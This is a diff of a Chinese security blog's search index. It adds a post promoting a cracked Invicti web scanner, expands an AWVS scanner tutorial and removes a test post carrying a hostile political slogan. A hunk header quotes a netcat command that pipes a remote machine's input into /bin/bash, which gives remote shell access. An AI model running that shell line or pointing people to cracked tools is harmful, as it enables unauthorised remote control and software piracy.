@@ -42,6 +42,27 @@
       </tags>
   </entry>
   <entry>
+    <title>Invicti v22.11.0破解版（原Netsparker)</title>
+    <url>/2023/04/21/invicti-shi-yong/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="Invicti"><a href="#Invicti" class="headerlink" title="Invicti"></a>Invicti</h3><p>Invicti，之前名为Netsparker，是一个基于web的应用程序安全扫描黑客工具，能够发现SQL注入、XSS、web应用程序中的漏洞。</p>
+<p>主要特点：</p>
+<ul>
+<li>它需要最小的配置；</li>
+<li>它可以在24小时内扫描1000多个网络应用程序；</li>
+<li>自动检测URL重写规则和自定义404错误页面；</li>
+<li>在特殊的基于证明的扫描技术的帮助下，它能以惊人的准确性发现漏洞；</li>
+</ul>
+<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686187562/4a471668222737_iapjh5.png"></p>
+<p>大型企业一般都用，所以在做大型任务时候，必备神器！</p>
+]]></content>
+      <categories>
+        <category>黑客工具</category>
+      </categories>
+      <tags>
+        <tag>invicti</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>netcat使用技巧</title>
     <url>/2023/04/21/netcat-shi-yong-ji-qiao/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Netcat常用参数"><a href="#Netcat常用参数" class="headerlink" title="Netcat常用参数"></a>Netcat常用参数</h2><ul>
@@ -153,7 +174,16 @@ kali：nc 192.168.0.107 4444 | /bin/bash | nc 192.168.0.107 4445
   <entry>
     <title>AWVS扫描使用教程</title>
     <url>/2023/04/01/awvs-sao-miao-shi-yong-jiao-cheng/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="AWVS-Web-Scanner使用教程"><a href="#AWVS-Web-Scanner使用教程" class="headerlink" title="AWVS-Web Scanner使用教程"></a><strong>AWVS-Web Scanner使用教程</strong></h2><h3 id="一、不需要登录的扫描"><a href="#一、不需要登录的扫描" class="headerlink" title="一、不需要登录的扫描"></a>一、不需要登录的扫描</h3><p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686183724/a1_jrrysj.png"></p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="AWVS-Web-Scanner使用教程"><a href="#AWVS-Web-Scanner使用教程" class="headerlink" title="AWVS-Web Scanner使用教程"></a><em>AWVS-Web Scanner使用教程</em></h1><p>Acunetix是道德黑客用来阻止恶意攻击者获得未经授权访问的自动化工具。JavaScript、HTML5和单页应用程序都可以作为安全扫描器被它扫描。它可以保护web应用程序免受一些网络缺陷的影响。</p>
+<p>主要特点：</p>
+<ul>
+<li>它可以扫描超过4000种类型的漏洞，包括SQL注入、XSS等；</li>
+<li>可作为内部部署或基于云的解决方案；</li>
+<li>它能够检测WordPress主题，核心和插件漏洞；</li>
+<li>它可以与问题跟踪器集成，解决SDLC中的问题；</li>
+<li>HTML5支持；</li>
+</ul>
+<h3 id="一、不需要登录的扫描"><a href="#一、不需要登录的扫描" class="headerlink" title="一、不需要登录的扫描"></a>一、不需要登录的扫描</h3><p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686183724/a1_jrrysj.png"></p>
 <h3 id="第二步：等待结果即可"><a href="#第二步：等待结果即可" class="headerlink" title="第二步：等待结果即可"></a>第二步：等待结果即可</h3><p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686183923/a2_mgbzip.png"></p>
 <h2 id="二、需要登陆的扫描"><a href="#二、需要登陆的扫描" class="headerlink" title="二、需要登陆的扫描"></a>二、需要登陆的扫描</h2><h3 id="第一步：新建扫描"><a href="#第一步：新建扫描" class="headerlink" title="第一步：新建扫描"></a>第一步：新建扫描</h3><p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686184353/a3_iywvmj.png"></p>
 <h3 id="第二步：输入目标IP地址，点击next"><a href="#第二步：输入目标IP地址，点击next" class="headerlink" title="第二步：输入目标IP地址，点击next"></a>第二步：输入目标IP地址，点击next</h3><p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686184521/a4_zmp5vd.png"></p>
@@ -167,20 +197,6 @@ kali：nc 192.168.0.107 4444 | /bin/bash | nc 192.168.0.107 4445
       </categories>
       <tags>
         <tag>AWVS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>我的博客试试看</title>
-    <url>/2023/04/01/wo-de-bo-ke-shi-shi-kan/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="灭共是正义的必须"><a href="#灭共是正义的必须" class="headerlink" title="灭共是正义的必须"></a>灭共是正义的必须</h1><h2 id="可以卑微入尘土，不可扭曲入蛆虫！"><a href="#可以卑微入尘土，不可扭曲入蛆虫！" class="headerlink" title="可以卑微入尘土，不可扭曲入蛆虫！"></a>可以卑微入尘土，不可扭曲入蛆虫！</h2><p>非常棒，很棒，很好</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token string">"hello world !"</span>
-</code></pre>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>系统</tag>
       </tags>
   </entry>
   <entry>
